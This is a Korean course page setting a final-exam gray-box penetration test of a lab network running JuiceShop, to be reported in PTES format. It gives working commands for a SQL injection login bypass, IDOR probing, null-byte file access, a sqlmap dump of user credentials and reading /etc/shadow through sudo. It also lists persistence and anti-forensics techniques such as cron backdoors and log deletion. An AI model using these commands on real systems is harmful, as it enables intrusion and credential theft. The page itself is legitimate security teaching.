# Week 15: 기말 — 종합 침투 테스트 + PTES 보고서

## 학습 목표
- PTES 7단계 방법론의 각 단계를 이해한다
- Gray Box 침투 테스트의 범위(Scope)와 교전 규칙(RoE)을 설정한다
- Week 02~14의 모든 기법을 조합하여 전체 인프라 대상 침투 테스트를 수행한다
- CVSS v3.1로 취약점 심각도를 산정한다
- 업계 표준 형식의 PTES 보고서(Executive Summary·Findings·Recommendations)를 작성한다
- Bastion `/ask`로 보고서 초안 자동 생성을 시도하고, 수동 검증·보강한다

## 실습 환경 (최종)

| 호스트 | IP | 역할 | 기말 시험 지위 |
|--------|-----|------|-----------------|
| manager | 10.20.30.200 | 공격 기지, Bastion API :8003 | 공격자 시작점 |
| secu | 10.20.30.1 | 방화벽/IPS | **범위 내** — 룰 분석 |
| web | 10.20.30.80 | JuiceShop | **범위 내** — 주요 표적 |
| siem | 10.20.30.100 | Wazuh·OpenCTI | **범위 내** — 취약점 점검 |

## 시험 개요

| 항목 | 내용 |
|------|------|
| 형식 | 실기 시험 + 보고서 |
| 시간 | 실기 3시간 + 보고서 작성 4시간 (총 7시간, 날짜 분리 가능) |
| 점수 | 100점 만점 + 보너스 15점 |
| 제출 | md 형식 PTES 보고서 + ATT&CK Navigator Layer JSON |

---

# Part 1: PTES 방법론

## 1.1 PTES 7단계

```
1. Pre-engagement Interactions     (사전 협의)   — 범위·규칙·일정
2. Intelligence Gathering          (정보 수집)   — OSINT·기술 스택
3. Threat Modeling                 (위협 모델링) — 자산·위협·공격 경로
4. Vulnerability Analysis          (취약점 분석) — 스캔·수동 분석
5. Exploitation                    (공격 실행)   — 악용·초기 접근
6. Post-Exploitation               (후속 공격)   — 권한 상승·지속성·수집
7. Reporting                       (보고서 작성) — Executive / Technical
```

**실무에서의 비중:**
- 정보 수집·분석 = 50% 시간
- 공격 실행 = 20%
- 보고서 = 30% (가장 많이 소홀하지만 가장 중요)

## 1.2 침투 테스트 유형

| 유형 | 사전 정보 | 시뮬레이션 대상 |
|------|-----------|-----------------|
| Black Box | 없음 | 외부 무관한 공격자 |
| White Box | 전체 (소스·네트워크 등) | 내부자·감사자 |
| Gray Box | 일부 (계정·IP·네트워크) | 부분 정보 가진 외부 |

**본 기말:** Gray Box — 네트워크(10.20.30.0/24)·SSH 계정(ccc/1)·API 키 제공.

---

# Part 2: 범위(Scope) 및 교전 규칙(RoE)

## 2.1 In-Scope / Out-of-Scope

**범위 내:**
```
서버: manager/secu/web/siem (10.20.30.0/24)
서비스: TCP·UDP 전 포트 스캔 가능
웹: JuiceShop(:3000), Apache(:80), Wazuh(:443)
```

**범위 외 (금지):**
```
- 10.20.30.0/24 외부 네트워크
- 물리적 접근 공격
- 소셜 엔지니어링 (실제 사람 상대)
- DoS/DDoS 공격
- 다른 학생의 환경
```

## 2.2 교전 규칙 (RoE)

```
R1. 공격은 실습 네트워크(10.20.30.0/24)에서만
R2. 서비스 가용성 의도적 저해 금지 (no DoS)
R3. 발견 데이터 외부 유출 금지
R4. 파괴적 명령 금지 (rm -rf /, dd, 디스크 포맷)
R5. 모든 공격 기록 (Bastion /evidence 또는 수동 메모)
R6. 설치한 지속성 메커니즘은 시험 종료 후 반드시 제거
R7. 발견 취약점은 보고서에만 기록, 악용 지속 금지
```

---

# Part 3: 보고서 구조

## 3.1 PTES 표준 보고서 구조

```
1. Cover Page
   - 프로젝트명·고객·테스터·날짜·기밀등급

2. Executive Summary (1페이지, 비기술자용)
   - 전체 위험도 (Critical/High/Medium/Low 건수)
   - Top 3 발견사항
   - 핵심 권고 사항

3. Test Overview
   - 범위·방법론·사용 도구·일정

4. Findings (각 취약점별)
   a. 제목 + CVSS 점수
   b. 영향 시스템
   c. 상세 설명
   d. 재현 단계 (step-by-step, 명령 포함)
   e. 증거 (stdout, 스크린샷, pcap)
   f. MITRE ATT&CK 매핑
   g. 권고 (구체적 수정 방법)

5. Appendix
   - 전체 스캔 결과
   - 사용 도구 목록
   - ATT&CK Navigator Layer JSON 링크
   - Bastion /evidence 요약
```

## 3.2 CVSS v3.1 등급

| 점수 | 등급 | 예시 |
|------|------|------|
| 9.0-10.0 | Critical | Admin 인증 우회, RCE, SSH 키 탈취 |
| 7.0-8.9 | High | IDOR 전체 사용자 접근, sudo NOPASSWD |
| 4.0-6.9 | Medium | CSP 부재, 버전 노출 |
| 0.1-3.9 | Low | HTTP 헤더 X-Powered-By 노출 |

## 3.3 취약점 보고 예시

```markdown
### F-01 [CRITICAL 9.8] JuiceShop SQL Injection

**시스템:** web (10.20.30.80:3000)
**URL:** /rest/user/login
**ATT&CK:** T1190 Exploit Public-Facing Application

**설명**
로그인 API의 email 필드에 SQL Injection이 가능하여 비밀번호 없이 admin 계정으로 로그인 가능.

**재현 단계**
1. 다음 요청 전송:
   ```bash
   curl -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"'\'' OR 1=1--","password":"x"}'
   ```
2. 응답 JSON의 `authentication.token` 획득
3. 토큰 디코딩 → `role: admin` 확인

**증거**
```
HTTP/1.1 200 OK
{"authentication": {"token": "eyJhbGciOi...", "umail": "admin@juice-sh.op"}}
```
디코딩된 페이로드: `{"role":"admin","id":1}`

**권고**
- 모든 SQL 쿼리를 파라미터화된 형태로 변경
- ORM(Sequelize) findOne({where: {email: userInput}}) 사용
- WAF에 SQLi 패턴 차단 룰 추가
```

---

# Part 4: 기말 실기 과제 (3시간)

## 4.1 채점 배점 (100점 + 보너스 15점)

| 항목 | 배점 | 세부 |
|------|------|------|
| 정찰 | 15 | 포트·서비스·버전·기술 스택 |
| 취약점 발견 | 30 | 발견 수·심각도 분포 |
| 공격 실행 | 20 | 실제 악용 성공·권한 상승 |
| ATT&CK 매핑 | 10 | Navigator Layer 정확도 |
| 보고서 품질 | 15 | 구조·재현 가능성·증거 |
| 권고 품질 | 10 | 구체성·실용성 |

**보너스:**
- Bastion 자동화 활용: +5
- Navigator Layer JSON 제출: +3
- 수동 찾기 어려운 취약점: +5
- 방어 룰 1개 이상 작성: +2

## 4.2 기대 발견 사항 목록 (체크리스트)

Week 02~12에서 다룬 모든 취약점. 기말에서는 스스로 재발견·보고.

```
[정찰·탐색]
□ 포트 오픈 목록 (nmap)
□ 서비스 버전 (Apache, Node.js Express, OpenSSH)
□ JuiceShop API 엔드포인트 (14+개)
□ /ftp 디렉토리 노출

[인증·접근제어 (A01/A07)]
□ admin 비밀번호 약함 (admin123)
□ SQL Injection → admin 로그인
□ IDOR — basket/1~N 접근
□ 수직 권한상승 — customer → admin API

[Injection (A03)]
□ SQLi (검색·로그인)
□ DOM/Reflected/Stored XSS

[보안 설정 오류 (A05)]
□ CSP 부재, HSTS 부재, CORS *
□ X-Powered-By 노출
□ /rest/admin/application-configuration 무인증 접근

[SSRF/파일 (A10)]
□ 프로필 이미지 URL SSRF
□ /ftp null byte(%2500) 우회
□ 파일 업로드 MIME 우회

[암호화 실패 (A02)]
□ JWT 페이로드에 MD5 password 노출
□ 자체서명 TLS (Wazuh)

[서버 권한상승]
□ sudo NOPASSWD:ALL (web)
□ SUID 바이너리 목록
□ /etc/shadow 읽기

[지속성·안티포렌식 (실습 시연만, 시험 후 제거 필수)]
□ SSH 키 인젝션
□ cron 백도어
□ 로그 삭제·타임스탬프 조작
```

## 4.3 실기 수행 예시 (수동 + Bastion 조합)

### 정찰 (15분)

```bash
# 전체 네트워크 + 서비스
nmap -sn 10.20.30.0/24
nmap -sV -p- 10.20.30.80 | head -30
nmap -sV -p 22,443,8080 10.20.30.100 | head -10

# API 구조
curl -s http://10.20.30.80:3000/main.js | grep -oE '/api/[A-Za-z]+' | sort -u
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
```

### 취약점 발견 (30분)

```bash
# SQLi
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | python3 -m json.tool

# IDOR
ADMIN_TOKEN=... # 위에서 획득
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "basket/$i: %{http_code}\n" \
    http://10.20.30.80:3000/rest/basket/$i \
    -H "Authorization: Bearer $ADMIN_TOKEN"
done

# /ftp null byte
for f in package.json.bak suspicious_errors.yml; do
  echo "=== $f ==="
  curl -s "http://10.20.30.80:3000/ftp/${f}%2500.md" | head -10
done

# sudo NOPASSWD
ssh ccc@10.20.30.80 "sudo -l | head -5"

# /etc/shadow
ssh ccc@10.20.30.80 "sudo cat /etc/shadow | head -3"
```

### 공격 실행·권한 상승 (30분)

```bash
# admin 토큰 → 관리자 API
curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{len(d[\"data\"])}명 사용자 유출')"

# sqlmap 자동화
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch -T Users -C email,password --dump 2>&1 | tail -30

# 수직 권한상승
ssh ccc@10.20.30.80 "sudo whoami"   # root
```

### 증거·보고서 (45분)

```bash
# Bastion evidence 전체 덤프
curl -s "http://10.20.30.200:8003/evidence?limit=100" > /tmp/evidence.json
python3 -c "
import json
data = json.load(open('/tmp/evidence.json'))
print(f'총 {len(data)}건 이력')
skills = {}
for e in data:
    skills[e.get('skill','?')] = skills.get(e.get('skill','?'), 0) + 1
for s, c in sorted(skills.items(), key=lambda x: -x[1]):
    print(f'  {s}: {c}회')
"
```

### Bastion 자동 보고서 초안 (15분)

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "오늘 /evidence에 기록된 최근 100건을 분석해서 PTES 형식 모의해킹 보고서 초안을 작성해줘. 섹션: Executive Summary / Test Overview / Findings (각 findings에는 CVSS·ATT&CK·재현·증거·권고 포함) / Appendix. 한국어, markdown."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])" > /tmp/draft_report.md

wc -l /tmp/draft_report.md
# → 초안을 수동으로 검증·보강하여 최종 제출
```

**중요:** Bastion이 생성한 초안은 **참고용**. 반드시 수동으로:
- hallucination 점검 (존재하지 않는 URL/CVE)
- 증거 스크린샷 추가
- 재현 단계 검증
- CVSS 점수 직접 산정

---

# Part 5: 보고서 템플릿

학생 제출용 최소 템플릿. 실제 제출 보고서는 아래 형식을 기본으로 확장.

```markdown
# CCC 모의해킹 보고서 — [본인 이름]
## 날짜: 2026-MM-DD | 과정: Course1-Attack | 기밀

## 1. Executive Summary

본 평가에서 JuiceShop과 주변 인프라에 대해 총 N개 취약점을 발견했다.
- Critical: X개
- High: Y개
- Medium: Z개
- Low: W개

핵심 권고:
1. ...
2. ...
3. ...

## 2. Test Overview

- 범위: 10.20.30.0/24 (manager/secu/web/siem)
- 방법론: PTES Gray Box
- 도구: nmap, curl, sqlmap, sqlite3, ssh, Python3, Bastion /ask
- 일정: 2026-MM-DD 10:00~13:00

## 3. Findings

### F-01 [CRITICAL 9.8] ...

**시스템:** ...
**ATT&CK:** ...
**설명:** ...
**재현:** ...
**증거:** ...
**권고:** ...

### F-02 [HIGH 8.8] ...
...

## 4. Appendix

### A. 전체 스캔 결과
...

### B. 사용 도구·버전
- nmap 7.94
- sqlmap 1.7.2
- Bastion Agent :8003 (gemma3:4b)

### C. ATT&CK Navigator Layer
(JSON 첨부)

### D. Bastion /evidence 요약
- 총 N건
- Skill 분포: ssh_exec X%, nmap_scan Y%, http_probe Z%
```

---

# Part 6: 과정 총괄 정리

## 6.1 학습한 전술(9) × 기법(35)

Week 02~12의 ATT&CK 매트릭스 커버리지. Week 13에서 Navigator Layer로 시각화.

## 6.2 수동 vs 자동 균형

- **수동 학습의 가치:** 명령·옵션·페이로드 구조 체득
- **자동화의 가치:** 반복 실습·증적 영속화·협업 효율
- **실무 현실:** 두 접근의 조합

## 6.3 다음 단계 (심화 과정)

| 다음 과정 | 내용 |
|----------|------|
| Course 11 Battle | Red vs Blue 공방전 |
| Course 12 Battle Advanced | APT 킬체인 시뮬 |
| Course 13 Attack Advanced | 고급 공격 (Kerberoast, AD, C2) |
| Course 14 SOC Advanced | 방어 관제 심화 |
| Course 20 Agent IR Advanced | AI 에이전트 공격 침해대응 심화 |

---

## 과제 (기말 제출물)

### 제출 1: PTES 보고서 (60점)
- `CCC_학번_모의해킹보고서.md`
- Part 5 템플릿 확장
- 최소 5개 Findings (각 CVSS + ATT&CK + 재현)

### 제출 2: ATT&CK Navigator Layer JSON (15점)
- `CCC_학번_attack_layer.json`
- Week 13에서 작성한 Layer 확장
- 기말에서 재발견한 모든 기법 포함

### 제출 3: 방어 권고서 (15점)
- 본인 발견사항별 방어 룰·정책·코드
- 최소 3개의 구체적 방어 구현 (예: Suricata rule, nftables rule, sudoers 수정)

### 제출 4: Bastion evidence 덤프 (10점)
- `curl -s "http://10.20.30.200:8003/evidence?limit=200" > evidence.json`
- 기말 시험 시간 동안 수행한 Bastion 호출 전체 이력

### 보너스 +15점
- Bastion `/ask` 자동 보고서 초안 제시 + 수동 보강 과정 분석 (+5)
- Week 13 Navigator Layer 기반 방어 커버리지 갭 분석 (+5)
- 수동으로 찾기 어려운 취약점 1개 이상 발견 (+5)

---

## 용어 해설 (최종)

| 용어 | 영문 | 설명 |
|------|------|------|
| **PTES** | Penetration Testing Execution Standard | 침투 테스트 7단계 표준 |
| **Scope** | - | 테스트 범위 (In/Out-of-Scope) |
| **RoE** | Rules of Engagement | 교전 규칙 |
| **Black/Gray/White Box** | - | 사전 정보 제공 정도 |
| **CVSS v3.1** | Common Vulnerability Scoring System | 취약점 심각도 산정 표준 |
| **Executive Summary** | - | 비기술자용 1페이지 요약 |
| **Findings** | - | 발견 사항 상세 (CVSS·ATT&CK·재현·증거·권고) |
| **Navigator Layer** | - | ATT&CK Navigator의 매핑 파일 (JSON) |

---

## 📂 기말 시험 도구 종합

### 수동 도구

| 도구 | 용도 | Week |
|------|------|------|
| nmap | 포트·서비스·OS | 02, 09 |
| curl | HTTP 요청 전반 | 전 주차 |
| python3 | JSON·JWT·base64·HMAC | 03, 04, 06 |
| sqlmap | SQLi 자동화 | 04, 10 |
| ssh + sudo | 서버 접근·권한상승 | 11, 12 |
| tcpdump / tshark | 패킷 캡처·분석 | 09 |
| openssl s_client | TLS 분석 | 03 |

### Bastion API (:8003)

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 지시 (정찰·스캔·보고서) |
| POST | `/chat` | 스트리밍 (ReAct 관찰) |
| GET | `/evidence?limit=N` | 이력 덤프 |
| GET | `/skills` | 사용 가능 Skill |
| GET | `/assets` | 관리 자산 목록 |
| GET | `/health` | 가동 확인 |

### 참조 리소스

- https://attack.mitre.org (ATT&CK)
- https://mitre-attack.github.io/attack-navigator/ (Navigator)
- https://gtfobins.github.io (권한상승 레시피)
- https://www.first.org/cvss/calculator/3.1 (CVSS 계산기)
- https://owasp.org/Top10/ (OWASP Top 10)

---

## 수료 안내

본 Week 15를 통과하면:
- **Course 1 Attack** 수료증 발급 대상
- 누적 실습: 14주 + 과제 + 기말 = 약 200시간
- 커버된 ATT&CK: 9 전술 × 35 기법

**다음 과정으로** (선택):
- Course 11 Battle — Red vs Blue 실전 공방전 참여
- Course 13 Attack Advanced — C2·AD·고급 기법
- Course 2 Security Ops — 방어 관제 관점으로 전환

수료를 축하합니다. 더 배우려면 심화 과정으로.

---

> **실습 환경 검증 완료** (2026-03-28): 전체 취약점 목록 실증 완료. 기말 제출물은 본인 이름·학번으로 제출.

---

## 실제 사례 (WitFoo Precinct 6 — w02-w14 record 인용 종합 표 + PTES 매핑)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *기말 — 종합 침투 테스트 + PTES 보고서* — 학생 본인의 종합 pentest 결과를 PTES 7-phase 양식으로. 본 dataset 의 record 들이 *PTES 어느 phase 에 어떻게 매핑되는지* 종합표 제공.

### Case 1: PTES 7-phase 별 dataset record 매핑 (학생 보고서 참고)

| PTES Phase | dataset record / 통계 | 본 과목 인용 주차 |
|-----------|----------------------|------------------|
| 1. Pre-engagement | dataset 메타 (2.07M signals, 595K edges, 4-layer 익명화) | w14 보고서 작성법 (course3) |
| 2. Intelligence Gathering | 100.64.20.230 1초 burst (30 host × 54 port) | w02 정찰 |
| 3. Threat Modeling | 14전술 매핑 표 (incident `e5578610`) | w13 ATT&CK 매핑 |
| 4. Vulnerability Analysis | WAF GET 4018건 (CEF 1줄에 7-layer evidence) | w03 웹 구조 + course3 w03 |
| 5. Exploitation | WAF POST 88건 (JSESSIONID 평문 + outcome=200) | w04 SQLi |
| 6. Post-Exploitation | 4624 logon 6190건 (USER-0022) + 5156 176K + 4663 file audit | w06 인증, w07 파일, w11 권한, w12 지속성 |
| 7. Reporting | 5 framework 매핑 (csc/cmmc/iso27001/soc2 + Precinct + Cisco) | w14 PTES 보고서 |

### Case 2: 본 과목 학생 보고서가 dataset *복원* 해야 할 4 layer

dataset 의 4-layer sanitization 방식 = 학생 보고서 *외부 공개 가능성* 보장:

```
Layer 1: regex (IP·email·domain pattern 자동 치환)
Layer 2: format-parse (구조화 데이터의 field-aware 마스킹)
Layer 3: ML/NER (자유 텍스트 의 named entity 추출)
Layer 4: Claude review (LLM 보조 사람 검토)
```

→ 학생 PTES 보고서도 *4-layer 적용 후* 외부 공개 가능. 자동 1단계만으로 부족.

### Case 3: 본 시스템의 자동 점검 결과 vs 학생 PTES 보고서 비교 표

| 비교축 | dataset (사람 4-layer 라벨) | Bastion 자동 (R3 진행) | 학생 PTES (이번 기말) |
|-------|--------------------------|---------------------|--------------------|
| 처리량 | 595K edges | 3,089 cases (2,047 pass) | 학생당 ~50 finding |
| 라벨 정밀도 | high (사람 검토 포함) | medium (LLM judge) | high (사람 작성) |
| 재현 가능성 | partition + node ID | cursor + queue | 보고서 partition + ID |
| 외부 공유 가능성 | Apache 2.0 공개 | 내부만 | 익명화 후 가능 |

**해석 — 본 lecture (기말 PTES) 와의 매핑**

| 기말 학습 항목 | 본 record 의 시사점 |
|--------------|---------------------|
| **PTES 7-phase 일관성** | dataset 의 record 들이 PTES 7-phase 모두에 매핑 가능 — 학생 보고서도 *7-phase 모두 채워야* 만점 |
| **재현 가능성** | dataset 의 partition + node ID 처럼 학생 보고서도 *재현 메타* 명시 |
| **익명화 4-layer** | 외부 공유 가능성 확보 위해 *동일 4-layer* 적용 |
| **multi-framework 매핑** | 본 dataset 의 host 가 *5 framework* 동시 매핑 — 학생 finding 도 동일 |
| **자동 vs 수동 균형** | dataset 도 *Claude review* (LLM) 사용 — 학생 PTES 도 LLM 보조 *허용* 하되 *최종 검토는 사람* 명시 |

**기말 채점 함의**:
- dataset 의 *4-layer + 5 framework + 7 phase* 종합 양식을 모방한 보고서 = 만점
- 단순 finding 나열 (framework 매핑 없음) = 감점


